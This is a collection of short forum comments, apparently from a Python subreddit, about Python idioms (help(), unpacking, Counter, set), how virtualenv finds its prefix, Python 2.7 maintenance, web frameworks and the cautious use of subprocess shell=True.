&gt; 9. Introspection tools &gt; I was vaguely aware of dir(), but I only found it occasionally useful. My life was changed when I discovered diveintopython.net's info() function. It prints the results of dir(), along with docstrings corresponding to each element. Why not use `help()`? (also `pydoc` from outside the python shell) &gt; There is a solution: parentheses without commas. I don't know why this works, but I'm glad it does. Strings next to one another are concatenated by the parser before generating the bytecode. So `"foo" "bar"` is parsed as `"foobar"`. &gt; `{key: value for value, key in enumerate(my_phrase)}` Doesn't work for that specific case (does for the reverse): `dict` can take either a mapping or an iterable of pairs, so `dict(enumerate(my_phrase))` is equivalent to `{index: value for index, value in enumerate(my_phrase))}` &gt; 8. Tuple unpacking In python 3, don't miss extended iterable unpacking: &gt;&gt;&gt; a, *b, c, d = range(10) &gt;&gt;&gt; print(a, b, c, d) 0 [1, 2, 3, 4, 5, 6, 7] 8 9 
I've done that before. It's a bad idea, but sometimes one liners are faster to write when on deadline.
Regarding your info(). Did you know about help()? It saves me a lot of internet bandwidth. 
I came across all of those eventually, but I still had no idea about chained comparison operators..I indeed assumed it 5 &gt; 4 &gt; 3 would evaluate to true &gt; 3
This is a snippet to add to the original, not a stand alone module. I would have included a docstring if the latter was the case.
You need to read all the way through - it's right at the end
There's a lot of hating here, but I found most of these tips genuinely useful! Python is a second language to me, so I don't know a whole lot about these short-hands.
Correct. Specifically, it causes lots of memory reallocations which can be extremely expensive. 
If you do `list.pop(0)` then all other elements are shifted one position left, which can take a lot of time. However, using a list as a stack is cheap since `list.pop()` removes the last element and no other elements need to be moved.
https://github.com/walac/pyusb
I did look at Lamson and at other tools, like Mailgun (as suggested by [drunkenfly](/user/drunkenfly)) as well, but there were two reasons why I decided to go with the built-in solutions: First, this was a quick side project I did for a friend. It was okay if it didn't turn out perfect. Also, I didn't want to spend days familiarizing myself with Lamson (which looks like an awesome tool to me btw) when I already had a basic understanding of how the postfix + python standard library combo works. Second, as [jnazario](/user/jnazario) pointed out, this project was mostly about getting to know the Standard Library tools for doing this. I am fairly new to python and I want to get good at using the "default way" of doing stuff, so I'll understand how they work when using a library or framework later.
I'll be darned. I wished I'd known about help() earlier!
That's absolutely right. Lists work great as a LIFO stack so long as the top of the stack is on the right. They make terrible FIFO queues though.
I copied it from diveintopython.net's tutorial; thanks to /r/python, I've just replaced it with help()!
Neat, I use nose's test generator and functools' partial, but your solution looks a lot more readable. This should be included in nose.
If nothing else, I've made some programmers feel good about themselves by learning they weren't as slow to catch on as me! ;-)
I don't quite understand the Counter example. It looks to me like what you'd do with a simple numeric array in any other language. I am quite new to Python, but if I understand correctly this Counter example might be useful because you don't have to initialize the list first, and possibly because of something having to do with lists being immutable. Also, you don't have to know the range of values you'll be using as indexes. Or is there something else I'm missing? In short, why couldn't this example be done like this? a = [] for i in range(10): a[i] = 0 for i in range(100): random_number = randrange(10) a[random_number] += 1 
Just a note, Graph API has a life-cycle and will work for a time, any other way to do probably will stop without any advertisement from Facebook.
your Object oriented video on python is really good btw. Even knowing python it was a fun watch and you make things very digestible.
This comes down to finding enough assignment combinations for the variables used in the if-conditions (and related variables), so that each possible branch through the function is taken at least once. Then you simply execute the function with each combination of values assigned to the "input" variables and see if it returns None. There are clever techniques to determine the required variable assignments. Keywords: concolic testing, symbolic execution, constraint solver, model checking. Useful implementations: Klee http://klee.github.io/, Java Path Finder The simplest solution to explore all paths should be to use random input, and backtracking. I.e. execute with random values, go back to a branch point, generate new assignment, check if at the branch point a new path is taken, and so on. Once you did explore every path through the function and none of them returned "None" you have your prove. To do this in practice you will likely need to specify constraints on the input parameters to reduce the serach space. I don't know if such a program exists for Python though. 
The first graphic in this article is from [Dan Langer's PyCon 2014 talk](http://youtu.be/q0YqAbI7rw4). I watched it a few months ago-- I remember thinking it was clear and informative.
In Python 3 you can use splat unpacking as well: head, *middle, tail = range(10) You can also nest unpacking and use additional splat unpacking inside them (but only one splat per level).
OK, yes, that's kind of what I was thinking - it's a more general case than the example I gave. I just thought maybe I was missing something less obvious.
Try `/r/learnpython`for this kind of question. (Though it kind of smells like homework, which people aren't generally fans of just doing for you.) Also, the code you pasted doesn't have indentation, try putting it in a code block, which you get if you start each line with 4 spaces. You'll get something like: def supervisor_call(floor): for ifloor in range(1,6): # rest of your code 
Know what you want to write before you start. What can help with this is having an outline for the structure of the code you know you need to write. Not pseudocode, but more like a literature paper's outline before the rough draft. Once you know what what you want to write looks like, it should be much easier to find yourself 'getting into it'. Cheers for the double what!
yeah we had a run with nose generator too, and it didn't end well.
It could be done like this, but Counter is more succinct, and what if you can't predict what the values will be to initialize the dict before you start counting them? Then every time a new value comes in you have to check it against the dict and initialize it if it's not among the keys.
How are you trying to teach yourself python? Converting pseudocode is a pretty hard way to get started. The sidebar suggests some pretty good books, some of which are free to read online, and there are also links to 4 good online exercise sites. That specific psuedocode doesn't make a whole lot of sense to me, to be honest. It seems to be trying to either set a variable, or call another method (`LiftCalled`) to the floor passed into the method. But the way it's structured, because iDirection is not given, it seems like if you gave it SupervisorCall(3) # that would result in LiftCalled(1, 1) = FALSE .... LiftCalled(3, 1) = TRUE LiftCalled(3, 2) = TRUE LiftCalled(4, 1) = FALSE ... Which doesn't make sense for an elevator/lift model, it's not called for both up and down directions at once. So anyway, if the goal is to learn python, try one of the books or online trainers in the sidebar and you'll probably have a lot more luck :)
Let's say it's even worse if you don't use the nice wrapper part
What would your full code be then? I have no idea
Main developer here so I am biased. :) It looks similar but is a lot more powerful in what it allows concerning reuse and extension, both fine-grained (views) and coarse-grained (apps). And it knows a lot more about links and HTTP status codes. Also see: http://morepath.readthedocs.org/en/latest/compared.html
This has me deeply unsettled.
 Like I said, it's nonsense code, but it would look something like this in python (depending on if in the pseudocode lift_called is trying to set a variable or call a function, which isn't clear.) # keep track of the state of the lift lift_called = {} def supervisor_call(floor): for i_floor in range(1,6): for i_direction in range(1,3): if i_floor == floor: lift_called[(i_floor, i_direction)] = True else: lift_called[(i_floor, i_direction)] = False
Quick bit of feedback: Consider defining constants like WINDOW_HEIGHT = 200, and PADDING = 10. Using named constants instead if "magic numbers" can make it easier to understand your intentions quickly.
A lot of people have now written jQuery style JavaScript with event bindings. For example, you can have a function assigned to a click event that is called whenever a user clicks a button.
It is very good to know how Python is handling security issues. Thank you! :-)
A few days ago I wrote a script that handles this problem. You can check it out [here](https://github.com/jabbalaci/wpython). It calls the script to be launched with the proper local Python interpreter in the venv. You don't need to specify the path of the local python binary: wpython /script/to/launch.py
Darcula is the best editor theme ever. Mainly because it's a global theme, not just the text areas. 
Hynek Schlawack wrote an article that discusses this: https://hynek.me/articles/virtualenv-lives/
One useful part of Counter is that you can initialize it directly from an iterable too. This will fail my_dict = dict('Dict of all of the chars in this string and their counts') This will not my_dict = Counter('Dict of all of the chars in this string and their counts') In general Counter is very useful for how it can be initialized, as well as for the ease of adding new keys. 
Some items in that list do not fit the [definition of a programming idiom](https://en.wikipedia.org/wiki/Programming_idiom) at all.
I believe it is possible with PyWin32/ctypes and MSDN documentation. * http://stackoverflow.com/questions/1025029/how-to-use-win32-apis-with-python * http://msdn.microsoft.com/en-us/library/ms679138%28v=vs.85%29.aspx * http://code.activestate.com/lists/python-win32/12912/
If you enjoyed that, you might also like `import antigravity`.
Virtualenv activation isn't necessary because **Python finds its environment relative to the Python executable's path**. I'll explain how that works now. When you run Python, it determines a **prefix** path, which is essentially the environment from which Python runs. It's the base from which the standard library is found, as well as your site-packages directory. This site-packages directory is where additional Python packages go (e.g. things you install with pip) so you can use them when Python runs. The site-packages directory is created for the system when Python is installed. However, when you work with a virtualenv, Python doesn't work from the system prefix. Instead, virtualenv supplants a new prefix path (your virtualenv) by copying the Python executables (bin) and standard library (lib) into a directory you specify and creates its own isolated site-packages directory. Python handles this "relocation" smoothly because, virtualenv or not, finding the prefix path is *relative*. It will "backtrack up the [interpreter's] path until it is exhausted". Specifically, Python knows it's found the prefix when the file &lt;prefix&gt;/lib/pythonX.Y/os.py exists (the os module file). For example, say you make a virtualenv at /home/foo and then you run /home/foo/bin/python3.4 When Python starts up, (among some other steps I'm leaving out) it will look attempt to use the following places as the *prefix*: /home/foo/bin/ /home/foo/ /home/ / But since the virtualenv installed a /home/foo/lib/python3.4, the search will stop at /home/foo, and that becomes your prefix (and the base for your environment). So, yes, virtualenv activation isn't necessary because Python finds its environment relatively. Run python -m site with and without a virtualenv to see the differences. Sources * https://www.python.org/dev/peps/pep-0405#specification * https://hg.python.org/cpython/file/ce8a8531d29a/Modules/getpath.c#l352 CPython's code for finding its prefix; read the comments at the top of that file for some more detail.
&gt; The only thing the activate script does is prepend that virtualenvs path to $PATH for that shell instance. Just no. Open the script, read it, and you'll see that it does a bunch more.
&gt; mycounter = Counter(randrange(10) for c in range(100)) I had no idea you could use a list comprehension as a function argument.
I know what you mean and in the past I have tried some of these fixes but they have never worked well. Plus I think this is a nice opputnity to use python.
Can you post a proper sample of the text file (i.e. more than one line) and format your code as described in the sidebar? Using `for value in file_obj:` will yield each line in the file. You probably want something more like: wordlist = [] for line in open('words.txt', 'rU'): # split line on whitespace and add the list to `wordlist` wordlist.extend(line.split()) # Drop the odd-numbered elements of `wordlist` (the numbers) # This goes through the list starting at the second element (index 1) # with step 2 wordlist = wordlist[1::2] 
For lists, you don't want to use the addition operator. That's used for joining two lists together. Instead, use list.append(string) to add an item to the end of the list. In this particular case, it'd be better to just create the list using list(file). That will automatically loop through any iterateable thing and build the list much more efficiently than a lot of .append() commands. If you want to split the numbers and words apart, using a list comprehension would be better: word_list = [line.split(" ") for line in flink2] This gives you a list of tuples, where [0] is the word and [1] is the number (in string form).
I'd also add knowing that you shouldn't use a mutable value for a keyword argument, like in def func(arg=[]). That trips me up. Also, since strings are immutable, if you are building a huge string put them in a list and then call join(). So instead of this: bigString = '' for s in stringList: bigString += s ...have this: bigString = [] for s in stringList: bigString.append(s) bigString = ''.join(bigString)
to build a syntax tree: import ast tree = ast.parse("def method(self): pass") 
Coded this last night, just for fun. It was a lot of fun to write. [dboudwin/domainduck](https://github.com/dboudwin/domainduck) [dboudwin/pseudenglish](https://github.com/dboudwin/pseudenglish)
Awesome, thanks!
On the topic of migraines, install f.lux and set it to do a heavy red shift 24/7. Especially if your desk isn't near a source of natural light. Makes your screen MUCH easier on your eyes. 
Nice explanation.
Also set comprehensions!
I learned a lot of these by doing kata on codewars. It's always helpful to see the best solution out of hundreds of answers.
no worries. i'll rewrite with that
I have. It does 2 things. 1. sets VIRTUAL_ENV and prepends that to $PATH when you source it 2. Has a function named deactivate() that removes VIRTUAL_ENV from the path 
Aaand manipulate a bunch of other variables.
Yeah, that's definitely true. I think it's done like that just so the person following (who might not be familiar with virtualenv) runs the virtualenv instances and not the global python/pip by accident 
Are you suggesting my use of "idiom" is not idiomatic?
Let me know which variables in there are super important then. The docs back up what I said, and also so does looking at the script. There's nothing in there that is useful outside of the context of the script that I can see.
Don't say "I'll be downvoted, but...". It does not contribute to any thread, it comes off as very passive-aggressive and hypocritical: if you really believe it will be downvoted, why bother posting it?
I thought 2.7 was the last, other than like this which is security updates. so we'll likely see 2.7.10 in the future too as exploits are found.
&gt; Because I was so used to statically typed languages (where this idiom would be ambiguous) This has nothing to do with static vs dynamic. Python just chooses to interpret "`x &lt; y &lt; z`" as "`(x &lt; y) and (y &lt; z)`". It is no more or less ambiguous in Python than it would be in a statically typed language.
If the rvalue is an infinite generator, **no** kind of unpacking will ever return. Not sure why you are singling out this particular form.
One of the beauties of Python are the extensive amount of abstract base classes. Makes many different objects behave the same way because they all inherit the base classes. I'm fairly certain the well done ABCs are the reason so many people actively enjoy using Python.
A lot of these tips remind me of [Transforming Code into Beautiful, Idiomatic Python](http://www.youtube.com/watch?v=OSGv2VnC0go) by Raymond Hettinger. If you haven't watched it, it's good. 
Thanks, really interesting read. It hasn't convinced me **why** both virtualenv and docker though. If you create a container specific for one app (which you usually do), what could you mess with a global pip install?
Starting to look a lot like Lisp...
Which part? The splat unpacking or nesting it? Because even nesting it two deep starts to look real messy to me.
Sounds awfully lot like no more updates to 2.X branch. 
Yep GvR and the other Python maintainers have explicitly said that there will be no 2.8 release and 2.7.x will only be receiving security updates until it's retired in 2020.
Yes, that is _exactly_ why I wasn't seriously considering Flask. I included it because, you know, someone might come up with something that I have overlooked. So yes, I completely agree.
Thanks for the feedback. &gt; aside from the feature above... which could pretty easily be implemented with some JavaScript regardless of which backend framework is selected So, how exactly do you do page views with javascript?
The generator comprehension will certainly be faster, the collections module is one of the more optimized modules. I also find that for long comprehensions splitting them up into multiple lines can be much more readable than many nested ifs and fors. I had a case not very long ago where I was scanning the windows registry several levels deep, pulling out the identifiers for all connected instances of a type of hardware. I first wrote it using normal for loops and ifs, but it ended up being about 10 layers deep. Rewritten as a generator comprehension passed into `set` it took up the same number of lines, but they were all at the at the same indentation. It was much easier to read and modify after that. 
What if you wanted to log in and analyze data within that docker? In that case you might want to install a bunch of modules useful for data analysis that have nothing to do with the app. A virtualenv is perfect.
Why copy out `stringList` one element at a time? Just do `bigString = ''.join(stringList)`
i.e., you could use AJAX via JQuery (or &lt;insert JS lib of your choice here&gt;) to change some stuff (effectively simulating partial page refreshes within the bounds of a DOM element) in response to a user clicking a "next" link. It wouldn't be 100% solvable via JS (you'd have to do some view stuff on the back end, too), but it's part of the solution (unless I totally misunderstood by what you meant in your initial post).
Yes. More than that: using pyenv + virtualenv + docker gives you the most flexibility. This will help to make your application deployable almost anywhere. For example I like to develop on my Mac, I can lock python and module versions in app-specific virtualenv and develop without using docker, but for production or integration testing move it to docker, and then if I want to, directly to vm in Vmware, or any other container with docker or without it. Not all apps are web apps, some are developed to run directly on a host OS. Moreover it makes it easier to bundle them in OS specific packages which can be installed by anyone. Another thing: it allows you to have supplementary tools have their specific virtualenvs, without polluting applications modules.
Guido is playing the long con...
&gt; The ensurepip module module has been backported, which provides the pip package manager in every Python 2.7 installation. See PEP 477. So, Python 2.7.x finally has pip by default? Yay.
Already tried that. I'd rather use WiFi at level 2
&gt; in general you should avoid `shell=True` like the plague Can you elaborate on this? I've run into cases where `shell=True` was necessary to accomplish what I was after. Why do you think people should avoid it?
And in cases where you need to flatten a 2+ dimensional list back into a simple one: `flat_list = [y for x in (['a', 'b'], ['c', 'd']) for y in x]` The list comprehension syntax makes much more sense when you think about it in terms of two `for` loops: my_list = [] for x in (['a', 'b'], ['c', 'd']): for y in x: my_list.append(y)
In my experience, the `set()` data type is undervalued and underutilized in enterprise programming environments. I've seen code that bends over backwards to accomplish what `set()` can do natively, but with much slower performance.
Fuck yeah it is.
Just a comment, the thing that would get me to consider another framework instead of Django or Flask is something that really targeted building a REST API with authentication and an admin panel and SQLAlchemy. Something http://www.django-rest-framework.org/ meets Flask. (or a unified and improved Flask/Flask-SQLAlchemy/Flask-Restful or Classy/Flask-SuperAdmin/Flask-Login). Even my toy projects these days are single page apps. Serving static assets and rendering HTML is so unnecessary now that by having it built into Flask makes Flask bloated (to me). I mention this because I've looked through your docs and it seems like you are touching a bit in this direction but you're doing a bunch of other stuff as well. The framework that's going to win me over is the one that can get me a strong and sophisticated REST API in the fewest keystrokes
Based on what? They're adding features.
Alright thank you.
&gt; Tested ... I don't see any test code. [I can also tell you with 100% certainty that this will break on Windows](https://github.com/jabbalaci/wpython/blob/7f1b1f13c9825b013e44718ac4c79c9fffffa7a4/wpython.py#L208).
You mentioned bundling your apps. How are you wrapping them for a Mac? py2app?
As long as we're treating `Counter` like some magical secret sauce, add `defaultdict` to the list.
Makes sense. This was a few years back, at another job. I don't remember exactly what it was I was trying to accomplish, to be honest. I think I needed to use a shell-specific feature like piping or executing a short shell script. Whatever the problem, I remember trying everything I could think of, including calling `/bin/sh` explicitly. I was about to conclude that what I was trying to do was impossible in the way that I wanted to do it, until I found the `shell=True` argument that made everything work. I think there are some valid use cases for it, but your point is also spot-on: it's not a feature to turn on without knowing the risks. (The installer for iTunes v2 had the potential to wipe whole drives because a programmer didn't properly quote a variable in a shell script.)
Almost any question like this the answer is "yes". Maybe not pass the Turing Test, but anything else...
Have a read to the right on the sidebar ----&gt;